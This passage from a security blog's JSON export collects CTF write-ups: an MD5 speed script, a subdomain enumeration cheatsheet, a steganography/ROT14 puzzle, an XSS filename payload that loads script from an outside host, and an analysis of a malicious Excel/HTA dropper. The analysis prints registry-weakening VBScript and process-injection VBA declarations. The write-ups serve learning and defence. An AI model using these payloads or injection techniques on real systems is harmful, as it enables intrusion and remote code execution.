flag.enc\n````\n\n```bash\necho 85207226509710165772552071797017127105619912251162198122221247160541401472369262271742012112545316135150142204418919456243508012347793238171624414717239197904625360240651911781134819438110141198309115324211710288352451321889757190762160220241831916671251638740588323211563152451211011623315491166614418188134821502402122448246942244424424121845296255199158132979219481922331863225489146180392241872361021291452615810810718860163108158184146622435125112622324412325110118471621513111416584501616845117202213181983215523779133369518716015622572418720624217814822325163016516842371231642511041423413422710222824017616621642302659157871751854620320122118152116 \u003e flag0.enc\n```\n\nok lets dry ant decrypt:\n```bash\n openssl rsautl -decrypt -inkey key.key -in flag.enc -out flag.txt\n```"},{"path":"blog/emdeefiveforlife","title":"HTB write up for the emdee five for life[EASY] challenge","subtitle":null,"published":true,"datePublished":1632890871205,"tags":["javascript","htb","md5","security","web"],"description":"we need to create a script to be able to decript and send a response fast enough..","canonicalUrl":"https://dev.lwlx.xyz/blog/emdeefiveforlife","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/default","thumbnailPhoto":"/default.png","content":"\n# emdee five for life _[EASY]_\n\nThis is my Write Up for the \"emdee five for life\" challenge from Hack The Box.\n\n![challenge info](/htb/emdeefiveforlife/challenge.png \"challenge info\")\n\nWe get a website with encrypted data, this can be decrypted easily.\n\n![website](/htb/emdeefiveforlife/website.png \"website info\")\n\nOk so its clear we need to create a script to be able to decript and send a response fast enough.. \n```javascript\nconst crypto = require(\"crypto\");\nconst http = require(\"http\");\nconst axios = require(\"axios\").default;\nconst httpAgent = new http.Agent({ keepAlive: true });\n\nconst loadData = async () =\u003e {\n  try {\n    const response = await axios.get(\"http://144.126.206.242:32609\", {\n      httpAgent,\n    });\n\n    const PAGE = response.data;\n    const x = \"\u003ch3 align='center'\u003e\";\n    const y = \"\u003c/h3\u003e\";\n    const string = PAGE.substring(\n      PAGE.indexOf(x) + x.length,\n      PAGE.lastIndexOf(y)\n    );\n\n    console.log(\"recieved string: \", string);\n    const md5 = (data) =\u003e crypto.createHash(\"md5\").update(data).digest(\"hex\");\n    const hash = md5(string);\n    console.log(\"new MD: \", hash);\n\n    const response2 = await axios({\n      method: \"post\",\n      url: \"http://127.0.0.1:32609\",\n      headers: {\n        \"Content-Type\": \"application/x-www-form-urlencoded\",\n        Cookie: \"PHPSESSID=ilimcjsspls1p1qpnhlbdbf6o6\",\n      },\n      data: `hash=${hash}`,\n      //go through burp proxy\n      proxy: {\n        host: \"127.0.0.1\",\n        port: 8080,\n      },\n      httpAgent,\n    });\n\n    console.log(response2.data);\n  } catch (error) {\n    console.error(error);\n  }\n};\n\nloadData();\n\n```\nrun the script: \n\n```shell\nnode exploit.js\n\n```"},{"path":"blog/subdomain-enumeration-sheet","title":"Subdomain enumeration cheatsheet for pentesters","subtitle":"find everything *.target.tld has to offer","published":true,"datePublished":1631383870315,"tags":["ctf","subdomain","web","enumeration","cheatsheet","hacking"],"description":"Subdomain enumeration cheatsheet for pentesters","canonicalUrl":"https://dev.lwlx.xyz/blog/subdomain-enumeration-sheet","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/default","thumbnailPhoto":"/default.jpg","content":"\n\n# **Subdomains Enumeration**\n\n## **Summary**\n\n- Enumerate Subdomains\n    - Subbrute\n    - KnockPy\n    - GoogleDorks\n    - EyeWitness\n    - Sublist3r\n    - Subfinder\n    - Findomain\n    - Aquatone\n    - AltDNS\n    - MassDNS\n    - Nmap\n\n## **Enumerate all subdomains (scope is *.domain.tld)**\n\n### **Using Subbrute**\n\n`git clone https://github.com/TheRook/subbrute\npython subbrute.py domain.example.com`\n\n### **Using KnockPy with Daniel Miessler’s SecLists for subdomain \"/Discover/DNS\"**\n\n`git clone https://github.com/guelfoweb/knock\ngit clone https://github.com/danielmiessler/SecLists.git\nknockpy domain.com -w subdomains-top1mil-110000.txt`\n\nUsing EyeWitness and Nmap scans from the KnockPy and enumall scans\n\n`git clone https://github.com/ChrisTruncer/EyeWitness.git\n./setup/setup.sh\n./EyeWitness.py -f filename -t optionaltimeout --open (Optional)\n./EyeWitness -f urls.txt --web\n./EyeWitness -x urls.xml -t 8 --headless\n./EyeWitness -f rdp.txt --rdp`\n\n### **Using Google Dorks and Google Transparency Report**\n\nYou need to include subdomains ;) [https://www.google.com/transparencyreport/https/ct/?hl=en-US#domain=[DOMAIN]g\u0026incl_exp=true\u0026incl_sub=true](https://www.google.com/transparencyreport/https/ct/?hl=en-US#domain=%5BDOMAIN%5Dg\u0026incl_exp=true\u0026incl_sub=true)\n\n`site:*.domain.com -www\nsite:domain.com filetype:pdf\nsite:domain.com inurl:'\u0026'\nsite:domain.com inurl:login,register,upload,logout,redirect,redir,goto,admin\nsite:domain.com ext:php,asp,aspx,jsp,jspa,txt,swf\nsite:*.*.domain.com`\n\n### **Using Sublist3r**\n\n`To enumerate subdomains of specific domain and show the results in realtime:\npython sublist3r.py -v -d example.com\n\nTo enumerate subdomains and enable the bruteforce module:\npython sublist3r.py -b -d example.com\n\nTo enumerate subdomains and use specific engines such Google, Yahoo and Virustotal engines\npython sublist3r.py -e google,yahoo,virustotal -d example.com\n\npython sublist3r.py -b -d example.com`\n\n### **Using Subfinder**\n\n`go get github.com/subfinder/subfinder\n./Subfinder/subfinder --set-config PassivetotalUsername='USERNAME',PassivetotalKey='KEY'\n./Subfinder/subfinder --set-config RiddlerEmail=\"EMAIL\",RiddlerPassword=\"PASSWORD\"\n./Subfinder/subfinder --set-config CensysUsername=\"USERNAME\",CensysSecret=\"SECRET\"\n./Subfinder/subfinder --set-config SecurityTrailsKey='KEY'\n./Subfinder/subfinder -d example.com -o /tmp/results_subfinder.txt`\n\n### **Using Findomain**\n\n`$ wget https://github.com/Edu4rdSHL/findomain/releases/latest/download/findomain-linux\n$ chmod +x findomain-linux\n$ findomain_spyse_token=\"YourAccessToken\"\n$ findomain_virustotal_token=\"YourAccessToken\" \n$ findomain_fb_token=\"YourAccessToken\" \n$ ./findomain-linux -t example.com -o`\n\n### **Using Aquatone Go**\n\n`# Subfinder version\n./Subfinder/subfinder -d $1 -r 8.8.8.8,1.1.1.1 -nW -o /tmp/subresult$1\ncat /tmp/subresult$1 | ./Aquatone/aquatone -ports large -out /tmp/aquatone$1\n\n# Amass version\n./Amass/amass -active -brute -o /tmp/hosts.txt -d $1\ncat /tmp/hosts.txt | ./Aquatone/aquatone -ports large -out /tmp/aquatone$1`\n\n### **Using AltDNS**\n\nIt's recommended to use massdns in order to resolve the result of `AltDNS`\n\n`WORDLIST_PERMUTATION=\"./Altdns/words.txt\"\npython2.7 ./Altdns/altdns.py -i /tmp/inputdomains.txt -o /tmp/out.txt -w $WORDLIST_PERMUTATION`\n\nAlternatively you can use [goaltdns](https://github.com/subfinder/goaltdns)\n\n### **Using MassDNS**\n\n`DNS_RESOLVERS=\"./resolvers.txt\"\ncat /tmp/results_subfinder.txt | massdns -r $DNS_RESOLVERS -t A -o S -w /tmp/results_subfinder_resolved.txt`\n\n### **Using Nmap**\n\n`nmap -sn --script hostmap-crtsh host_to_scan.tld`\n"},{"path":"blog/htb-black-hole-challenge-writeup","title":"HTB write up for the Black Hole[EASY] challenge","subtitle":"getting started with forensics","published":true,"datePublished":1611757758022,"tags":["ctf","writeup","hackthebox","BlackHole","htb","security"],"description":"A write up for the Black Hole[EASY] challenge","canonicalUrl":"https://dev.lwlx.xyz/blog/htb-black-hole-challenge-writeup","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/htb/htb-black-hole","thumbnailPhoto":"/htb/htb-black-hole-thumb.jpg","content":"\nThis is my Write Up for the \"Black Hole\" challenge from Hack The Box.\n\nLike so often we are given a zip file called Blackhole.zip, naturraly we unzip it using cli:\n\n```shell\nunzip Blackhole.zip\n```\n\nIt seems the Zip contained another zip called 'archive.zip' , so lets try and open that one.\n\nwe got a file called 'hawkins' it seems to be an image file, not really tho..\nIs there a hidden message in this image? after some googling i found out about a tool called steghide.\n\n[steghide](http://steghide.sourceforge.net/download.php) allowed me to look for a hidden message withing this file. Thanks @nieg for pointing in this direction.\n\nI ran steghide like this:\n\n```shell\nsteghide extract -sf hawking\n```\n\nnice! we get a file named Flag.txt.\nIt seems its content in encoded:\n\n```shell\nUldaeFluUnhlaUJKZFhoNGRXMTVJRlJ0YVhkMWVuTWdhVzFsSUcxNklGRjZjM2gxWlhRZ1puUnhZV1J4Wm5WdmJYZ2dZblJyWlhWdmRXVm1MQ0J2WVdWNVlYaGhjM1ZsWml3Z2JYcHdJRzFuWm5SaFpDd2dhWFJoSUdsdFpTQndkV1J4YjJaaFpDQmhjaUJrY1dWeGJXUnZkQ0J0WmlCbWRIRWdUM0Y2Wm1SeElISmhaQ0JHZEhGaFpIRm1kVzl0ZUNCUFlXVjVZWGhoYzJzZ2JXWWdablJ4SUVkNmRXaHhaR1YxWm1zZ1lYSWdUMjE1Ym1SMWNITnhJRzFtSUdaMGNTQm1kWGx4SUdGeUlIUjFaU0J3Y1cxbWRDNGdWSEVnYVcxbElHWjBjU0JZWjI5dFpYVnRlaUJDWkdGeWNXVmxZV1FnWVhJZ1dXMW1kSEY1YldaMWIyVWdiV1lnWm5SeElFZDZkV2h4WkdWMVptc2dZWElnVDIxNWJtUjFjSE54SUc1eFptbHhjWG9nTVRrM09TQnRlbkFnTWpBd09TNGdWRzFwZDNWNmN5QnRiM1IxY1doeGNDQnZZWGw1Y1dSdmRXMTRJR1ZuYjI5eFpXVWdhWFZtZENCbGNXaHhaRzE0SUdsaFpIZGxJR0Z5SUdKaFltZDRiV1FnWlc5MWNYcHZjU0IxZWlCcGRIVnZkQ0IwY1NCd2RXVnZaMlZsY1dVZ2RIVmxJR0ZwZWlCbWRIRmhaSFZ4WlNCdGVuQWdiMkZsZVdGNFlYTnJJSFY2SUhOeGVuRmtiWGd1SUZSMVpTQnVZV0YzSUUwZ1RtUjFjWElnVkhWbFptRmtheUJoY2lCR2RYbHhJRzFpWW5GdFpIRndJR0Y2SUdaMGNTQk9aSFZtZFdWMElFVm5lbkJ0YXlCR2RYbHhaU0J1Y1dWbUxXVnhlSGh4WkNCNGRXVm1JSEpoWkNCdElHUnhiMkZrY0MxdVpIRnRkM1Y2Y3lBeU16Y2dhWEZ4ZDJVdUlGUnRhWGQxZW5NZ2FXMWxJRzBnY25GNGVHRnBJR0Z5SUdaMGNTQkVZV3R0ZUNCRllXOTFjV1pyTENCdElIaDFjbkZtZFhseElIbHhlVzV4WkNCaGNpQm1kSEVnUW1GNlpuVnlkVzl0ZUNCTmIyMXdjWGxySUdGeUlFVnZkWEY2YjNGbExDQnRlbkFnYlNCa2NXOTFZblZ4ZW1ZZ1lYSWdablJ4SUVKa2NXVjFjSEY2Wm5WdGVDQlpjWEJ0ZUNCaGNpQlNaSEZ4Y0dGNUxDQm1kSEVnZEhWemRIRmxaaUJ2ZFdoMWVIVnRlaUJ0YVcxa2NDQjFlaUJtZEhFZ1IzcDFabkZ3SUVWbWJXWnhaUzRnVlhvZ01qQXdNaXdnVkcxcGQzVjZjeUJwYldVZ1pHMTZkM0Z3SUhwbmVXNXhaQ0F5TlNCMWVpQm1kSEVnVGs1UFhPS0FtV1VnWW1GNGVDQmhjaUJtZEhFZ01UQXdJRk5rY1cxbWNXVm1JRTVrZFdaaGVtVXVEUXBVUms1N1dqTm9jVVJmZUROR1gyWlVNMTl1TkdWR2JVUndOVjlUTTJaZlN6Qm5YM0F3YVZwOUlBPT0=\n```\n\nThis string seems to be base64 encoded twice, who knows why, cuz this doesnt make it any harder.\nLets decode this in the browser:\n\n```JavaScript\nconst x = atob(atob('UldaeFluUnhlaUJKZFhoNGRXMTVJRlJ0YVhkMWVuTWdhVzFsSUcxNklGRjZjM2gxWlhRZ1puUnhZV1J4Wm5WdmJYZ2dZblJyWlhWdmRXVm1MQ0J2WVdWNVlYaGhjM1ZsWml3Z2JYcHdJRzFuWm5SaFpDd2dhWFJoSUdsdFpTQndkV1J4YjJaaFpDQmhjaUJrY1dWeGJXUnZkQ0J0WmlCbWRIRWdUM0Y2Wm1SeElISmhaQ0JHZEhGaFpIRm1kVzl0ZUNCUFlXVjVZWGhoYzJzZ2JXWWdablJ4SUVkNmRXaHhaR1YxWm1zZ1lYSWdUMjE1Ym1SMWNITnhJRzFtSUdaMGNTQm1kWGx4SUdGeUlIUjFaU0J3Y1cxbWRDNGdWSEVnYVcxbElHWjBjU0JZWjI5dFpYVnRlaUJDWkdGeWNXVmxZV1FnWVhJZ1dXMW1kSEY1YldaMWIyVWdiV1lnWm5SeElFZDZkV2h4WkdWMVptc2dZWElnVDIxNWJtUjFjSE54SUc1eFptbHhjWG9nTVRrM09TQnRlbkFnTWpBd09TNGdWRzFwZDNWNmN5QnRiM1IxY1doeGNDQnZZWGw1Y1dSdmRXMTRJR1ZuYjI5eFpXVWdhWFZtZENCbGNXaHhaRzE0SUdsaFpIZGxJR0Z5SUdKaFltZDRiV1FnWlc5MWNYcHZjU0IxZWlCcGRIVnZkQ0IwY1NCd2RXVnZaMlZsY1dVZ2RIVmxJR0ZwZWlCbWRIRmhaSFZ4WlNCdGVuQWdiMkZsZVdGNFlYTnJJSFY2SUhOeGVuRmtiWGd1SUZSMVpTQnVZV0YzSUUwZ1RtUjFjWElnVkhWbFptRmtheUJoY2lCR2RYbHhJRzFpWW5GdFpIRndJR0Y2SUdaMGNTQk9aSFZtZFdWMElFVm5lbkJ0YXlCR2RYbHhaU0J1Y1dWbUxXVnhlSGh4WkNCNGRXVm1JSEpoWkNCdElHUnhiMkZrY0MxdVpIRnRkM1Y2Y3lBeU16Y2dhWEZ4ZDJVdUlGUnRhWGQxZW5NZ2FXMWxJRzBnY25GNGVHRnBJR0Z5SUdaMGNTQkVZV3R0ZUNCRllXOTFjV1pyTENCdElIaDFjbkZtZFhseElIbHhlVzV4WkNCaGNpQm1kSEVnUW1GNlpuVnlkVzl0ZUNCTmIyMXdjWGxySUdGeUlFVnZkWEY2YjNGbExDQnRlbkFnYlNCa2NXOTFZblZ4ZW1ZZ1lYSWdablJ4SUVKa2NXVjFjSEY2Wm5WdGVDQlpjWEJ0ZUNCaGNpQlNaSEZ4Y0dGNUxDQm1kSEVnZEhWemRIRmxaaUJ2ZFdoMWVIVnRlaUJ0YVcxa2NDQjFlaUJtZEhFZ1IzcDFabkZ3SUVWbWJXWnhaUzRnVlhvZ01qQXdNaXdnVkcxcGQzVjZjeUJwYldVZ1pHMTZkM0Z3SUhwbmVXNXhaQ0F5TlNCMWVpQm1kSEVnVGs1UFhPS0FtV1VnWW1GNGVDQmhjaUJtZEhFZ01UQXdJRk5rY1cxbWNXVm1JRTVrZFdaaGVtVXVEUXBVUms1N1dqTm9jVVJmZUROR1gyWlVNMTl1TkdWR2JVUndOVjlUTTJaZlN6Qm5YM0F3YVZwOUlBPT0='))\nconsole.log(x)\n\n//Output:\nx = `Efqbtqz Iuxxumy Tmiwuzs ime mz Qzsxuet ftqadqfuomx btkeuouef, oaeyaxasuef, mzp mgftad, ita ime pudqofad ar dqeqmdot mf ftq Oqzfdq rad Ftqadqfuomx Oaeyaxask mf ftq Gzuhqdeufk ar Omyndupsq mf ftq fuyq ar tue pqmft. Tq ime ftq Xgomeumz Bdarqeead ar Ymftqymfuoe mf ftq Gzuhqdeufk ar Omyndupsq nqfiqqz 1979 mzp 2009. Tmiwuzs motuqhqp oayyqdoumx egooqee iuft eqhqdmx iadwe ar babgxmd eouqzoq uz ituot tq pueogeeqe tue aiz ftqaduqe mzp oaeyaxask uz sqzqdmx. Tue naaw M Nduqr Tuefadk ar Fuyq mbbqmdqp az ftq Ndufuet Egzpmk Fuyqe nqef-eqxxqd xuef rad m dqoadp-ndqmwuzs 237 iqqwe. Tmiwuzs ime m rqxxai ar ftq Dakmx Eaouqfk, m xurqfuyq yqynqd ar ftq Bazfuruomx Mompqyk ar Eouqzoqe, mzp m dqoubuqzf ar ftq Bdqeupqzfumx Yqpmx ar Rdqqpay, ftq tustqef ouhuxumz mimdp uz ftq Gzufqp Efmfqe. Uz 2002, Tmiwuzs ime dmzwqp zgynqd 25 uz ftq NNO\\âe baxx ar ftq 100 Sdqmfqef Ndufaze.\nTFN{Z3hqD_x3F_fT3_n4eFmDp5_S3f_K0g_p0iZ}`\n\n```\n\nWe got some sort of unreadable Text coupled with what seems to be a flag.\n\n```\nHTB{this_is_the_usu4l_f0rmat_for_flags}\nTFN{Z3hqD_x3F_fT3_n4eFmDp5_S3f_K0g_p0iZ}\n```\n\nsimiliarities are striking! why? well cuz its a caesar cipher.. how do we know? only the letters are affected, 'TFN' is 'HTB' shifted by 14, so they must be using ROT14. Give it a try on cyberchef:\n\n![solved ciphertext](/cipherROT14.png \"solved ciphertext\")\n\nThats it! we got our flag 😄\n\nhave a look at [this challenge on my GitHub](https://github.com/Lawlez/myOSWE/tree/master/htb/challanges/misc/Black%20Hole)\n"},{"path":"blog/hacker101-ctf-tempimage","title":"Hacker101 CTF TempImage [moderate] Write-Up","subtitle":"a work in progress","published":true,"datePublished":1611357758022,"tags":["ctf","writeup","hackerone","TempImage","security"],"description":"A write up for the TempImage [moderate] challenge","canonicalUrl":"https://dev.lwlx.xyz/blog/hacker101-ctf-tempimage","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/hackerone/tempimage/tempimage-hackerone","thumbnailPhoto":"/hackerone/tempimage/tempimage-hackerone.webp","content":"\n### `WIP`\n\nThis is my Write Up for the \"TempImage\" challenge of HackerOne's CTF.\n\nAs usual we get a link to webpage, it seems to some sort of cloud storage application, on the main Page we get a really simple page:\n\n```jsx\n\u003c!-- https://ctf.hacker101.com/ctf/launch/12 --\u003e\n\n\u003chtml\u003e\n  \u003chead\u003e\n    \u003ctitle\u003eTempImage \u0026mdash; Trial\u003c/title\u003e\n  \u003c/head\u003e\n  \u003cbody\u003e\n    \u003ch1\u003eTempImage\u003c/h1\u003e\n    \u003cp\u003e\n      \u003cb\u003eUNREGISTERED\u003c/b\u003e\n    \u003c/p\u003e\n    \u003cp\u003e\n      \u003ca href=\"upload.php\"\u003eUpload image\u003c/a\u003e\n    \u003c/p\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nIt signifies that its an UNEGISTERED version of the app, thus working in trial mode.\n\n## Enumeration\n\nSo lets start to explore the app and what it can do. We start by clicking the \"Upload image\" Button.\nThis leads us to a new page **/upload.php**, here we can select a file from our computer, and have a submit button to send the form.\n\nThe form will be sent to a **doUpload.php** file. Upon closer inspection we alos see that there is a hidden field \"filename\", which gets filled in by a JS snippet.\n\n```jsx\n   \u003ch1\u003eUpload\u003c/h1\u003e\n\t\t\u003cform action=\"doUpload.php\" method=\"POST\" enctype=\"multipart/form-data\"\u003e\n\t\t\t\u003cinput type=\"file\" name=\"file\" id=\"file\"\u003e\n\t\t\t\u003cinput type=\"hidden\" name=\"filename\" id=\"filename\"\u003e\n\t\t\t\u003cinput type=\"submit\" value=\"Upload\"\u003e\n\t\t\u003c/form\u003e\n\t\t\u003cscript\u003e\n\t\t\t$(document).ready(function() {\n\t\t\t\t$('#file').change(function(e) {\n\t\t\t\t\t$('#filename').val(e.target.files[0].name)\n\t\t\t\t})\n\t\t\t})\n\t \u003c/script\u003e\n```\n\nSo it seems this lil script extracts the `file.name` prop from the fileOpbject the user uploads to the input type=\"file\".\n\nLets Try it out, It seems the file inpput allows any file to be chosen, lets try a 5mb .gif file.\n\n```jsx\n\u003ccenter\u003e\u003ch1\u003e413 Request Entity Too Large\u003c/h1\u003e\u003c/center\u003e\n\u003chr\u003e\u003ccenter\u003enginx/1.14.0 (Ubuntu)\u003c/center\u003e\n```\n\nOK, fair, maybe 5mb was a it large, but we know we're working with an nginx 1.14 server on Ubuntu.\nSo how about we try a smaller gif?\n\n```shell\nERROR: Only PNG format supported in trial.\n```\n\nOkay, finally we know what the app expects from us, a PNG file. So we try jsut that.\nThe upload succeeds, thus redirecting us to a new url:\n`/files/be9c26aaea9d9b5085c7f6eed0812745_uhhhh.png`\n\nso it seems our files are uploaded to the `/files/` directory, what a suprise, the file stil contains our original filename, preceeded by some gibberish.\n\nwe should deffinetly try to exploit this, check wheter or not they sanitize our filename.\n\nLets try uploading a file named: `javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2FDiscover.xss.ht%5C%27%3Bdocument.body.appendChild%28a%29%27%29.png`\n\nWe now get redirected to this url `http://35.190.155.168/d29c8e00db/files/9975e7e24fac21e8b877a6d08efe09c6_javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2FDiscover.xss.ht%5C%27%3Bdocument.body.appendChild%28a%29%27%29.png`\n\nand we get served this content:\n\n```javascript\nNot Found\nThe requested URL /files/9975e7e24fac21e8b877a6d08efe09c6_javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https:/Discover.xss.ht\\';document.body.appendChild(a)').png was not found on this server.\n\nApache/2.4.7 (Ubuntu) Server at 127.0.0.1 Port 52736\n```\n\nso it seems there is potential there, we just need a more sophisticated payload to upload.\n\n## Taking a step back\n\nIt's important not to get tunnelvision and only focus on your first finding, so lets take a step back and analyze the website using Burp Suite. Maybe we'll find something.\nLets analyze the upload URL first:\n\n```shell\nGET /d29c8e00db/upload.php HTTP/1.1\nHost: 35.190.155.168\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nConnection: close\n```\n\nThis does not tell us that much, it seems the server could accep more than just PNG tho.\n\nHow about if we upload an image?\n\n`POST /d29c8e00db/doUpload.php HTTP/1.1`\n\n![image upload Request](/hackerone/tempimage/tempimage-hackerone101-burpSuite_fileupload.png \"image upload Request\")\n\n\u003e This Post is marked as `WIP` and will be updated continously.\n"},{"path":"blog/htb-obfsc4t10n-challenge-writeup","title":"HTB write up for the oBfsC4t10n[HARD] challenge","subtitle":"security through obscurity?","published":true,"datePublished":1611316432536,"tags":["ctf","writeup","hackthebox","oBfsC4t10n","htb","security"],"description":"write up for the oBfsC4t10n[HARD] challenge","canonicalUrl":"https://dev.lwlx.xyz/blog/htb-obfsc4t10n-challenge-writeup","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/htb/htb-obfuscation","thumbnailPhoto":"/htb/htb-obfuscation-thumb.jpg","content":"\n### `(WIP)`\n\nThis is my Write Up for the \"oBfsC4t10n\" challenge from Hack The Box.\n\nWe are given a _zip file_. after extraction we are presented with an **html** file telling us to download an **excel file**.\nThe excel file has been included in the html as a **base64 encoded** string, lets just save that info for later `base64.txt` in case we need it.\n\n\u003e decoding `base64.txt` actually gives us a valid excel like file.\n\nAfter we checked the HTML and deemed the download save lets fetch the excel file.\n\n## Enumeration\n\nInstead of trying to open or analyze the file on our own machine, lets go ahead and upload it to **ANY.RUN**.\n\n\u003e [https://ANY.RUN](https://ANY.RUN) is a **online Sandbox** service that allows you to open various suspicious files or programms to fully analyze what would happen, without the danger.\n\nAfter Testing the file with **ANY.RUN** we were able to see how the exploit would work and what would be done. So we tested on a **Windows 7** Machine, after opening the file, the exploit imediately startet to run:\n\n![excel-file-report](/htb/obfuscation/file-report.png)\n\n\u003e 1. At first a temp file was created under `C:\\Users\\admin\\AppData\\Local\\Temp\\CVR40EB.tmp.cvr`\n\u003e 2. Then a what seems to be `visual basic script` executer was added here: `C:\\Users\\admin\\AppData\\Local\\Temp\\VBE\\MSForms.exd`\n\u003e 3. followed by a `.hta` file with a funny name..: `C:\\Users\\admin\\AppData\\Local\\Temp\\LwTHLrGh.hta` \u003c-- lemme guess thats the one.\n\u003e 4. it then makes use of `mshta.exe` to try and execute the `LwTHLrGh.hta` file.\n\u003e 5. then ANY.RUN stops executing the file.\n\n![important files](/htb/obfuscation/file-modifications.png)\n\nI went ahead and _downloaded_ the `MSForms.exd` as well as the `LwTHLrGh.hta` file so we can analyze them further.\n\n## Analyzing `LwTHLrGh.hta`\n\n\u003e .hta is a propriatary file format used by microsoft, its called '**HT**ML **A**pplication' and supports HTML code as well as **Visual Basic** or **JScript**. This format was meant to be used by Internet Explorer.\n\u003e\n\u003e The **default file-association** for the .hta extension is the Microsoft HTML Application Host (**mshta.exe**). If you have not disabled or changed this file association, in effect the HTA file behaves like an executable when double-clicked. An **HTA runs** as a **fully trusted application** and as a result has a lot **more privileges than a normal HTML** file.\n\nSounds dangerous, nice!\n\nSo lets disect this bitch!\n\nWhen opening the file we see it has a rather clear structure, a huge VB Script and **even comments**. How nice of the hacker not to obfuscate his code too much, thanks [@0xdf](https://twitter.com/0xdf_). ;-)\n\n```jsx\n\"\u003chtml\u003e\u003chead\u003e\n\n\u003cscript language=\"vbscript\"\u003e\n\n\u003c!-- VB script here --\u003e\n\n\u003c/script\u003e\u003c/head\u003e\u003c/html\u003e\"\n```\n\nso naturally, since its practiacally all the code, we strip the vbcode out of the .hta to make it readable.\n\nThank god we know VB, otherwise this would be a pain from here on now. ;-) Thankfully, since the autor has left some comments, indicating how the attack works, we should be able to cope with it.\n\nThe very first thing he does is effectively creating a backup of the AccessVBOM key **if** it has been set before.\n\n```vb\n' Get the old AccessVBOM value\nRegPath = \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\" \u0026 objExcel.Version \u0026 \"\\Excel\\Security\\AccessVBOM\"\n\nif RegExists(RegPath) then\n        action = WshShell.RegRead(RegPath)\nelse\n        action = \"\"\"\"\nend if\n```\n\n\u003e \"_Setting AccessVBOM to 1 allows to access the VBA Object Model_\"\n\nThen he 'weakens the target' by setting the AccessVBOM to 1, thus enabling all acces to VBA Object Model.\n\n```VB\n' Weaken the target\nWshShell.RegWrite RegPath, 1, \"REG_DWORD\"\n```\n\nThen he gets to the juicy part.\nTo Exploit the Security setting he just turned off, he creates a new Excel Workboo, with macros of course.\nHe then proceeds to add VBComponents to the Excel, allowing him to add an Assembly Code Module.\n\n```VB\n' Run the macro\nSet objWorkbook = objExcel.Workbooks.Add()\nSet xlmodule = objWorkbook.VBProject.VBComponents.Add(1)\nxlmodule.CodeModule.AddFromString ... 80 more lines...\n\n```\n\nIn his last step this good boy restores the systems registry to its previous state.\n\n```vb\n' Restore the registry to its old state\nif action = \"\" then\n        WshShell.RegDelete RegPath\nelse\n        WshShell.RegWrite RegPath, action, \"REG_DWORD\"\nend if\nself.close\n```\n\n\u003e xlmodule.CodeModule.AddFromString contains many obfuscated lines of assembly code, I deobfuscated it by printing it via VBS.\n\nHere is the actualy assembly code payload:\n\n```cpp\nPrivate Type PROCESS_INFORMATION\n    hProcess As Long\n    hThread As Long\n    dwProcessId As Long\n    dwThreadId As Long\nEnd Type\n\nPrivate Type STARTUPINFO\n    cb As Long\n    lpReserved As String\n    lpDesktop As String\n    lpTitle As String\n    dwX As Long\n    dwY As Long\n    dwXSize As Long\n    dwYSize As Long\n    dwXCountChars As Long\n    dwYCountChars As Long\n    dwFillAttribute As Long\n    dwFlags As Long\n    wShowWindow As Integer\n    cbReserved2 As Integer\n    lpReserved2 As Long\n    hStdInput As Long\n    hStdOutput As Long\n    hStdError As Long\nEnd Type\n\n#If VBA7 Then\n    Private Declare PtrSafe Function CreateStuff Lib \"kernel32\" Alias \"CreateRemoteThread\" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr\n    Private Declare PtrSafe Function AllocStuff Lib \"kernel32\" Alias \"VirtualAllocEx\" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n    Private Declare PtrSafe Function WriteStuff Lib \"kernel32\" Alias \"WriteProcessMemory\" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr\n    Private Declare PtrSafe Function RunStuff Lib \"kernel32\" Alias \"CreateProcessA\" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long\n#Else\n    Private Declare Function CreateStuff Lib \"kernel32\" Alias \"CreateRemoteThread\" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long\n    Private Declare Function AllocStuff Lib \"kernel32\" Alias \"VirtualAllocEx\" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long\n    Private Declare Function WriteStuff Lib \"kernel32\" Alias \"WriteProcessMemory\" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long\n    Private Declare Function RunStuff Lib \"kernel32\" Alias \"CreateProcessA\" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo 